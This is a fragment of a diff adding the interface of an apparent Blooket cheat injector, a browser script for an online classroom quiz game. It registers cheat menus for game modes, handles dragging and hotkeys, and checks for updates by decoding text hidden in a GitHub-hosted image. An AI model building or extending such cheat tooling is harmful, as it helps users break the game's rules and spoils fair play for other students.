bn8t5XNzXuiLo6zrGw2fvDsWW49gfq3bnnw6RTMC5rvss8B1TO7aAL63yOK8FD5d2Jyf43toho5W+GRzHHspm0/eGUKzfIsoZ2I9S5ZrSIMyS8I0z8qxoobOFCXuKB9YOMdfgkscZpBR527beGUKxTm0/KsOu6+4BrsPg2ZkZ5trw7TPyvKEFtpFZ1jT3rRniNLM7/o+TTDofy2bT/x2KsVMQ6RqM67r/juFi0QyLkwURNPP1s0LkuevM3ZzZrX+0q5Rk0vl+Njvw+VCMVaAei3B3AP8WhqHlXYXmYFYzLh0Kj79ZtYc3zzGb6ZvBcay9liUvC8WYD5H/K4ujgg8Cr4Zh77xe+PKgR6qZRCA8PpLby1ULzVb4ZpBSTjmOfUEUvf7f+lbUHwBwXXcUuBoI5TjIW+d5PHJ2nv6aj0GEj5R5/nb1Lq43uNGjFCEgmXT+OJNJ/zoUg1Womx+5rvtTCiODUFjTA4+tyTf0QupUYpJ/Pmcn75gf3namRCJxfzabDnzBgynGW8JqRSn1TeD9Ydk7Og1//ivBlv2aE+2aW8IWdB/jwbN30Wf2oNNJOI796sqV2YHQDAagES3p9UDgS4yq0WXBVwY9NtRxR9FZ8w/xxO/sDLXyLUuOO471u6EZDEjdBeC67hhwFZr3Dp4KCdya9rhzuRf5hpJ3nzbMt87YE+o9B0IIL5Fwrsxk0ubrxTXSkL6067ovAR+gyru2tXJdv8e/nJmP5LEqIfN8cuVrfMbwDN+pSCadO7LZ9ObQDQeg7n2AUpRS76KwZhBqf373OHxiu+Cp0QBuGqAP0Nd1jLsG97AmpAmeUlKpxMZcbkDrYGcYNFQAAEqpy4GHgNAneh/5P8GtrwiG/eKMjwCkzHPtacPcvEz/1q5KFIZ7idtyuYHbQzdeSzkaLQAApdQlwCNA6AfFDk7B7b8W3L+3QjSoIIBls8e4d1CxJKQ5/VKEECSTzi253MDG0I3XWpZmEACAUmo98K9AJCP7Hx8UfHy74JXymdoyAdj2NH+V3csH+82ua6mEEIJUyrkx6jn+oDSNAACUUhcCm4FInpkYz8PnhwRf2CWYnPmzSwSwdsEhvrByL73mr3WeEiGEl0o5N2SzA/dE8gENmkoAAEqpC4AtQGR7g7eNwc07JC8cAvYtoic5wWdWKKP7eatRqPzE9dls+h8j+4gGTScAAKXUOuBxYF6U33lyRPDskMeGJeHM41eiWPl/lM2m74v0Qxo0pQAAlFLnULiGZn6U3xkerkvlvz+bTd8f6Yc0aaZF1ZNwXfe/gPVAXVbFokBKOZVKJa5q1sqHJhYAgOu6LwJrgab9B1bCceydqZSTzmbTDzW6LH40bRNQjlLqD4G7CXmEEHYTIITwkknnK7ncwIdCNRwRTR0BSnFd9z4KN5H8tNFlqYRlWWOpVOJtrVL50EICAHBddzvwJuCzGLxeEgWJhPOTZNJelM2mn2p0WWqhZZqAcpRSFwNfBxab2DFtAqQU+UTCuTmXGzC+rqURtKwAAJRSCyncXn6Frg0TATiOtc9x7LdkMumqr3Q3Ky0tgBmUUjdQaBZqXlHUEYAQkEg4312+PHN1zZmbjJbqA1TCdd1NwLkY3F8cFNu29qdSyXe3Q+VDm0SAUpRSVwCfA1YFSR80AliWnHAce2MYN3M1E20RAUopXlt3FnADYLx/qziufyCZdOa0W+VDG0aAUpRSc4GbgQ1UmECqFAGEEJ7j2D+xbXlNLe/wtRptLYAZlFJ9FCLCXwB9pb+VC6CwQ9f+gWXJP8lk0jvqV8rG0BECmEEp1UPhXMJNFOcPZgQgpcg7jv2oZckP1fryVivTUQKYQSmVpHBg9cOjo4dXOY79oJTiIybXrrcq/w99zo6mO4xCQAAAAABJRU5ErkJggg==", Cheats.rush);
+        addMode("<span style=\"font-size: 18px\">Monster Brawl</span>", [`<img style="height: 28px; margin-left: 5px; margin-right: 8px" src="https://media.blooket.com/image/upload/v1655233787/Media/survivor/xp/Blue_xp_2.svg">`], Cheats.brawl);
+        addMode("<span style=\"font-size: 15px\">Santa's Workshop</span>", ['<img style="height: 28px; margin-left: 3px; margin-right: 6px" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTkuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIKCSB2aWV3Qm94PSIwIDAgNTEyIDUxMiIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNTEyIDUxMjsiIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8cGF0aCBzdHlsZT0iZmlsbDojRkZERTc2OyIgZD0iTTQzMy42NjEsMjM3LjgzN2MtNC40OTctNi4yMTQtNC44OC0xNC40NC0xLjIyNS0yMS4xODRjMTEuMzY1LTIwLjk2NywxNy43NzMtNDUuMDE0LDE3LjY1MS03MC41NjYKCUM0NDkuNzAxLDY0Ljg2OSwzODIuNTY0LTEuMDM3LDMwMS4zNTIsMC4wMTJjLTgwLjE4MywxLjAzNi0xNDQuODY0LDY2LjM1OS0xNDQuODY0LDE0Ni43ODhjMCwzMi41NTMsMTAuNTk1LDYyLjYzLDI4LjUyNiw4Ni45NzIKCWM3Ljc1MywxMC41MjYsNy4yMTMsMjUuMS0xLjU0MywzNC44MDhjLTEzLjI5NywxNC43NDEtNDEuOTM1LDI0LjMwNi0xMDIuNTk1LTE2LjI3N2MtNi42NTItNC40NS0xNC40NjItNi44NjQtMjIuNDY1LTYuODY0bDAsMAoJYy0xOS45NDcsMC0zNi44MzMsMTQuNjI4LTM5Ljc3NiwzNC4zNTdDNy44ODksMzUxLjgxNiw2LjUyLDUxMiwyMDYuOTY2LDUxMmg3MS4wODNDNDY2LjA1LDUxMiw1MTYuMTI3LDM1MS44MDEsNDMzLjY2MSwyMzcuODM3eiIvPgo8Zz4KCTxwYXRoIHN0eWxlPSJmaWxsOiNGRkI2NDE7IiBkPSJNMTgzLjQ3LDI2OC41ODJjLTMuOTMsNC4zNTctOS4yMDIsOC4yNjEtMTYuMjQ0LDEwLjU1MmMyNC40NjksNS44ODIsMzguODItMS4zMTksNDcuMTQ5LTEwLjU1MgoJCWM4Ljc1Ny05LjcwOCw5LjI5Ni0yNC4yODEsMS41NDMtMzQuODA4Yy0xNy45My0yNC4zNDItMjguNTI2LTU0LjQyLTI4LjUyNi04Ni45NzNjMC03NS44MzMsNTcuNTAzLTEzOC4yMjYsMTMxLjI4MS0xNDUuOTgKCQljLTUuNjg5LTAuNjAxLTExLjQ2Ny0wLjg4NC0xNy4zMjMtMC44MDljLTgwLjE4MywxLjAzNi0xNDQuODY0LDY2LjM1OS0xNDQuODY0LDE0Ni43ODhjMCwzMi41NTMsMTAuNTk1LDYyLjYzLDI4LjUyNiw4Ni45NzMKCQlDMTkyLjc2NiwyNDQuMywxOTIuMjI2LDI1OC44NzMsMTgzLjQ3LDI2OC41ODJ6Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojRkZCNjQxOyIgZD0iTTQ5LjUzOSwyNzkuNzk2YzIuMTM3LTE0LjMxNywxMS42MTgtMjUuOTQyLDI0LjI4Mi0zMS4yNDVjLTQuODY2LTIuMDIyLTEwLjA5MS0zLjExLTE1LjQxMi0zLjExCgkJbDAsMGMtMTkuOTQ3LDAtMzYuODMzLDE0LjYyOC0zOS43NzYsMzQuMzU3QzcuODg5LDM1MS44MTYsNi41Miw1MTIsMjA2Ljk2Niw1MTJoMzAuOTA1QzM3LjQyNSw1MTIsMzguNzk0LDM1MS44MTYsNDkuNTM5LDI3OS43OTZ6CgkJIi8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojRkZCNjQxOyIgZD0iTTgwLjUxOCwzNDQuMzM2Yy04Ljc2Niw4LjY1Ni0xMC4yNzcsMjIuMjY4LTMuNTk4LDMyLjYxOQoJCWMxOS41MDQsMzAuMjI3LDY4LjM1MSw4Ni4yODMsMTYyLjM3Miw4Ni4yODNjNTcuMjU2LDAsMTE3Ljc5MS0zNS44MDksMTI5LjA2NC05NS4wOTdjOS4zMS00OC45NjYtMTkuMjQ2LTEwOC44MjEtNzUuMzMtMTA2LjI0NwoJCWMtNDEuMDk3LDEuODg3LTY1LjEzNSwzNy40MTUtOTkuODY1LDUzLjg0MWMtMjQuMzk4LDExLjU0LTUwLjg0NCwxOC42NTEtNzcuNjg3LDIxLjMwNwoJCUMxMDIuNjk4LDMzOC4zMDYsOTAuODA1LDMzNC4xNzgsODAuNTE4LDM0NC4zMzZ6Ii8+CjwvZz4KPHBhdGggc3R5bGU9ImZpbGw6IzM4NDg0QTsiIGQ9Ik0zODguMzk0LDExMC44MzNjLTMuNTAyLDAtNi42NzQtMi4zOTYtNy41MTMtNS45NTFsLTMuNzE1LTE1LjczCgljLTAuOTgxLTQuMTUzLDEuNTkxLTguMzE1LDUuNzQzLTkuMjk1YzQuMTUyLTAuOTc5LDguMzE1LDEuNTkxLDkuMjk1LDUuNzQzbDMuNzE1LDE1LjczYzAuOTgxLDQuMTUzLTEuNTkxLDguMzE1LTUuNzQzLDkuMjk1CglDMzg5LjU4LDExMC43NjUsMzg4Ljk4MiwxMTAuODMzLDM4OC4zOTQsMTEwLjgzM3oiLz4KPHBhdGggc3R5bGU9ImZpbGw6I0ZGQjY0MTsiIGQ9Ik00MjcuNjE4LDY4Ljk5NGMwLDAsMy4xOTgsNDUuODMyLTE4LjAzMyw2Ni41OTFjLTIxLjIzMSwyMC43NTksMTQuMTU0LDUzLjMxNCw1Ni4xNDUsMjIuNjQ2CgljNi4wMzItNC40MDUsMTIuMTQzLTcuMjA0LDE4LjE4NC04Ljc2OGM3Ljc3Ny0yLjAxMiwxMy4yNDMtOC45NjcsMTMuMjQzLTE2Ljk5OWwwLDBjMC03LjcyNC01LjAzMS0xNC41OTctMTIuNDM4LTE2Ljc4NgoJYy00LjkyNS0xLjQ1Ni0xMS4xOC0yLjMyNS0xOC41MTYtMS4zMjVjMCwwLDI1LjM5My0yMi4xMzgsMTkuMTE5LTQ3Ljc1M2MtMi4wMjctOC4yOC0xMS44NTYtMTEuNzI2LTE4LjgzNi02LjgzMgoJQzQ1Ny40NjEsNjYuMDk0LDQ0My40NTQsNzIuNzY0LDQyNy42MTgsNjguOTk0eiIvPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8L3N2Zz4K">'], Cheats.workshop);
+        addMode("Settings", null, Cheats.settings, true);
+        
+        dragElement(controls, guiWrapper);
+        dragElement(dragButton, guiWrapper);
+        
+        function dragElement(element, parent) {
+            var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+            element.onpointerdown = function (e = window.event) {
+                pos3 = e.clientX;
+                pos4 = e.clientY;
+                document.onpointerup = function () {
+                    document.onpointerup = null;
+                    document.onpointermove = null;
+                };
+                document.onpointermove = function (e = window.event) {
+                    pos1 = pos3 - e.clientX;
+                    pos2 = pos4 - e.clientY;
+                    pos3 = e.clientX;
+                    pos4 = e.clientY;
+                    var ratio = 1 || parseFloat((0.75 / window.devicePixelRatio).toFixed(2));
+                    parent.style.top = (parent.offsetTop - pos2 / ratio) + "px";
+                    parent.style.left = (parent.offsetLeft - pos1 / ratio) + "px";
+                }
+            }
+        }
+        window.addEventListener("keydown", keydown);
+        function close() {
+            guiWrapper.remove();
+            for (const category in Cheats) for (const cheat of Cheats[category]) if (cheat.enabled) cheat.run()
+            Object.keys(Cheats).forEach(mode => Cheats[mode].forEach(cheat => cheat.enabled && (cheat.run(), setCheats(...currentMode))));
+            window.removeEventListener("keydown", keydown);
+        };
+        let last;
+        guiWrapper.addEventListener("mousemove", e => {
+            if (e.target.className != "cheatName" && e.target.className != "scriptButton") {
+                if (tooltip.style.opacity != "0") {
+                    tooltip.animate([{ opacity: 0.9 }, { opacity: 0 }], { duration: 200 });
+                    tooltip.style.opacity = "0";
+                }
+                return;
+            }
+            const target = e.target.className == "scriptButton" ? e.target : e.target.parentElement;
+            if (tooltip.innerText == target.dataset.description && tooltip.style.opacity == "0.9") return;
+            const button = target.getBoundingClientRect();
+            const parent = target.offsetParent.getBoundingClientRect();
+            tooltip.innerText = target.dataset.description;
+            if (tooltip.style.opacity == "0") {
+                tooltip.animate([{ opacity: 0 }, { opacity: 0.9 }], { duration: 200 });
+                tooltip.style.opacity = "0.9";
+            }
+            tooltip.style.left = (button.x - parent.x) + (button.width - tooltip.clientWidth) / 2 + "px";
+            tooltip.style.top = (button.y - parent.y) + (button.height) + "px";
+        });
+        function keydown(e) {
+            let hideKey = Settings.data.hide || { ctrl: true, key: "e" };
+            let closeKey = Settings.data.close || { ctrl: true, key: "x" };
+            if (((hideKey.ctrl && e.ctrlKey) || (!hideKey.ctrl && !e.ctrlKey)) && ((hideKey.shift && e.shiftKey) || (!hideKey.shift && !e.shiftKey)) && ((hideKey.alt && e.altKey) || (!hideKey.alt && !e.altKey)) && e.key.toLowerCase() == hideKey.key) {
+                e.preventDefault();
+                guiWrapper.style.display = guiWrapper.style.display === "block" ? "none" : "block";
+            } else if (((closeKey.ctrl && e.ctrlKey) || (!closeKey.ctrl && !e.ctrlKey)) && ((closeKey.shift && e.shiftKey) || (!closeKey.shift && !e.shiftKey)) && ((closeKey.alt && e.altKey) || (!closeKey.alt && !e.altKey)) && e.key.toLowerCase() == closeKey.key) {
+                e.preventDefault();
+                close();
+            }
+        }
+        function createKeybindListener(onpress, element = window) {
+            return new Promise(resolve => {
+                const pressed = {};
+                let shift, ctrl, alt, key;
+                const keydown = e => {
+                    e.preventDefault();
+                    pressed[e.code] = true;
+                    shift ||= e.shiftKey;
+                    ctrl ||= e.ctrlKey;
+                    alt ||= e.altKey;
+                    if (!["shift", "control", "alt", "meta"].includes(e.key.toLowerCase())) key = e.key.toLowerCase();
+                    onpress?.({ shift, ctrl, alt, key });
+                };
+                const keyup = e => {
+                    delete pressed[e.code];
+                    if (Object.keys(pressed).length > 0) return;
+                    element.removeEventListener("keydown", keydown);
+                    element.removeEventListener("keyup", keyup);
+                    resolve({ shift, ctrl, alt, key });
+                };
+                element.addEventListener("keydown", keydown);
+                element.addEventListener("keyup", keyup);
+            });
+        }
+    });
+    let img = new Image;
+    img.src = "https://raw.githubusercontent.com/05Konz/Blooket-Cheats/main/autoupdate/timestamps/gui.png?" + Date.now();
+    img.crossOrigin = "Anonymous";
+    img.onload = function() {
+        const c = document.createElement("canvas");
+        const ctx = c.getContext("2d");
+        ctx.drawImage(img, 0, 0, this.width, this.height);
+        let { data } = ctx.getImageData(0, 0, this.width, this.height), decode = "", last;
+        for (let i = 0; i < data.length; i += 4) {
+            let char = String.fromCharCode(data[i + 1] * 256 + data[i + 2]);
+            decode += char;
+            if (char == "/" && last == "*") break;
+            last = char;
+        }
+        let iframe = document.querySelector("iframe");
+        let _, time = 1710881112502, error = "There was an error checking for script updates. Run cheat anyway?";
+        try {
+            [_, time, error] = decode.match(/LastUpdated: (.+?); ErrorMessage: "((.|\n)+?)"/);
+        } catch (e) {}
+        if (parseInt(time) <= 1710881112502 || iframe.contentWindow.confirm(error)) cheat();
+    }
+    img.onerror = img.onabort = () => {
+        img.onerror = img.onabort = null;
+        cheat();
+        let iframe = document.querySelector("iframe");
+        iframe.contentWindow.alert("It seems the GitHub is either blocked or down.\n\nIf it's NOT blocked, join the Discord server for updates\nhttps://discord.gg/jHjGrrdXP6")
+    }
+})();
+
